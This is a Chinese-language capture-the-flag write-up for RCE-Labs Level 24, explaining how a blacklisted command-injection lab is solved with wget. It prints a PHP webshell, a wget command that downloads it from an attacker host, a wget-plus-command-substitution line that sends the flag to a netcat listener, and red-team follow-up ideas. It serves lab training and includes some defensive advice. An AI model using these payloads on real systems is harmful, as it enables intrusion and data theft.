RCE-Labs Level 24 - wget 命令网络下载与 HTTP 外带

2026年10月5日 RCE-Labs 数据外带 无回显RCE

一、题目信息

  • 题目名称：RCE-Labs Level 24 (wget 命令网络下载与 HTTP 外带)
  • 题目平台：RCE-Labs 靶场 (灵境平台部署)
  • 题目类型：Web安全 / 远程代码执行 (RCE) / 数据外带 (Out-of-Band)
  • 靶场链接：http://靶机IP:8080/less-24/
  • 涉及工具：浏览器、Mac 终端 (Netcat、Python HTTP 服务器)

二、解题步骤

1. 分析题目考什么

黑名单封禁了 echo 和 curl，但 wget 未被拦截。题目弹窗提示：“使用 wget 命令下载文件，下载远程文件”。这是一道经典的无回显 RCE 场景，核心考点是利用网络协议（HTTP）进行数据外带（Exfiltration）或远程文件下载写马。

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping|curl|echo/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

2. 怎么想（破题思路）

既然无法在靶机上直接写马（echo 被禁）或外带（curl 被禁），我们需要利用 wget 通过网络协议来传输数据。主要分为两种思路：

  • 方案 A（下载写马）：在攻击机（Mac）搭建 HTTP 服务器，让靶机通过 wget 下载木马文件到 Web 目录。
  • 方案 C（HTTP 外带）：让靶机通过 wget 向攻击机发起 HTTP 请求，将 Flag 拼接在 URL 中，利用攻击机的监听端口接收数据。

3. 怎么解（详细实操与逐字解析）

方案 A：本地服务器 + wget 写马（成功）

第一步：制作木马并搭建服务。在 Mac 终端执行：

echo '<?php system($_GET["cmd"]);?>' > ~/Desktop/shell.txt
cd ~/Desktop && python3 -m http.server 8000

第二步：让靶机下载木马。在浏览器输入：

?cmd=wget http://192.168.1.19:8000/shell.txt -O 1.php

第三步：利用木马读取 Flag。访问：

http://靶机IP:8080/less-24/1.php?cmd=sed -n '1,10p' /flag

方案 B：本地协议与重定向（踩坑与成功）

踩坑 1：尝试 ?cmd=wget file:///flag -O 7.txt，访问 7.txt 失败。原因是 Docker 容器内的 BusyBox wget 不支持 file:// 协议。

改进：直接使用重定向。执行 ?cmd=sed -n '1,10p' /flag > 8.txt，然后访问 8.txt，成功回显 Flag。

方案 C：HTTP 外带（终极大招，成功）

踩坑 1：Mac 终端执行 nc -lvnp 9001 报错 nc: missing port with option -l。原因是 macOS 的 BSD 版 Netcat 参数与 Linux 不同，不支持 -p。

修正：直接执行 nc -l 9001，开启监听。

执行 Payload：

?cmd=wget http://192.168.1.19:9001/$(sed -n '1p' /flag)

逐字解析：

  • wget：发起网络下载的工具。
  • http://192.168.1.19:9001/：目标 URL 指向我们 Mac 的 9001 监听端口。
  • $(sed -n '1p' /flag)：$() 是命令替换符。它先执行里面的 sed 命令读取 flag 文件的第一行，然后用这个结果替换掉 $() 本身。

最终结果：Mac 终端成功接收到 HTTP 请求：GET /flag{TEST_Dynamic_FLAG} HTTP/1.1。

4. 怎么迁移（跨学科与跨领域联想）

  • 真实渗透中的红队打点：护网行动中，拿到 RCE 后最标准的动作就是 wget 远程下载 Webshell 写进 Web 目录，或者通过 DNS/HTTP 外带内网敏感数据。
  • 供应链攻击：攻击者常用 wget 从恶意服务器下载带有后门的依赖包或安装脚本，实现自动化入侵。
  • 数字取证与应急响应：安全人员监控服务器日志时，若发现大量 wget 请求指向陌生 IP，往往意味着服务器已被植入后门。

三、名词大全与原理深度复盘

1. wget 命令详细介绍

wget（World Wide Web get）是 Linux 中用于从网络下载文件的工具，支持 HTTP、HTTPS 和 FTP 协议。

  • 核心参数 -O：指定下载后保存的文件名。在写马时必须加 -O 1.php，否则默认保存为原文件名（shell.txt），Web 服务器无法解析。
  • 与 curl 的区别：curl 默认把内容输出到屏幕，wget 默认保存为文件。在 RCE 无回显场景下，wget 更适合静默写马。

2. Netcat (nc) 与 macO S参数差异

nc 是网络工具中的“瑞士军刀”，常用于监听端口和反弹 Shell。

  • Linux 版写法：nc -lvnp 9001，其中 -l 代表监听，-v 详细输出，-n 不解析域名，-p 指定端口。
  • macOS (BSD) 版写法：不支持 -p，正确写法为 nc -l 9001。

3. 命令替换 $() 与反引号 `` ` ``

在 Shell 中，$() 和反引号都用于命令替换。Shell 会先执行括号内的命令，然后用其标准输出替换掉整个表达式。在 RCE 外带中，这能让 Flag 直接拼接进 URL 路径中。

4. 为什么能绕过 WAF？

WAF 通常检测 URL 中是否包含 <?php 等特征。而在方案 C 中，请求里只有普通的 URL 和 sed 命令，真正的恶意数据（Flag）是作为 HTTP 路径的一部分发出的，完美绕过了基于请求文本的 WAF 过滤。

四、题目思考

1. 这跟前面关卡的区别

前面关卡（Level 21-23）以“内部读取”和“重定向写入”为主，数据始终留在靶机内部。而 Level 24 实现了真正的“网络外带”，利用 HTTP 协议将数据发送到外部网络（攻击机），这标志着你正式掌握了无回显 RCE 的终极解决方案。

2. 这种题目的出现原因（底层逻辑与历史原因）

在真实的服务器架构中，Web 服务器通常位于 DMZ 区，可以访问互联网或内网办公区，但 Web 代码本身没有回显。攻击者通过让 Web 服务器主动发起 HTTP 请求（如 wget、curl），将敏感数据夹带在 URL 或 Header 中，这就是 OOB（带外）攻击的底层逻辑。只要服务器能向外发起请求，数据就有可能被外带。

3. 这种漏洞在实际中的应用

主要用于外带数据库数据、服务器配置文件、密码 Hash 等敏感信息。在护网中，红队常通过 DNSLog 平台配合无回显 RCE 探测漏洞是否存在，或利用 HTTP 外带一次性拿到大量内网数据。

4. 如何抽象理解概念（大白话）

把靶机比作一个被关在密室里的哨兵，他能说话（能执行命令），但密室隔音（无回显），你听不到。但哨兵有一部只能发短信的手机（HTTP 请求），他可以把情报写成短信，发到你的手机上（你的监听端口）。你不需要听到他说话，只看短信内容就行了。

5. 他的本质

利用受控主机向攻击主机发起的单向通信信道。它绕过了服务器对“输出回显”的限制，将攻击者与受控主机的交互从“请求-响应”模式转变为“主动外发”模式。

6. 如果我是出题人或者攻击者我会怎么防守或者破解

  • 防守方（蓝队）：实施严格的出站流量白名单，禁止 Web 服务器主动访问非授信 IP；部署全流量审计设备，监控异常的 HTTP/DNS 外发请求；在 WAF 层面拦截包含特殊字符（如 {、}、$()）的请求。
  • 破解方（红队）：如果 HTTP 出站被禁，尝试使用 ICMP 隧道或 DNS 隧道外带数据；使用加密流量的 C2 通道；如果外带被完全阻断，退而求其次，尝试结合反序列化漏洞直接写内存马，在内存中控制服务器。
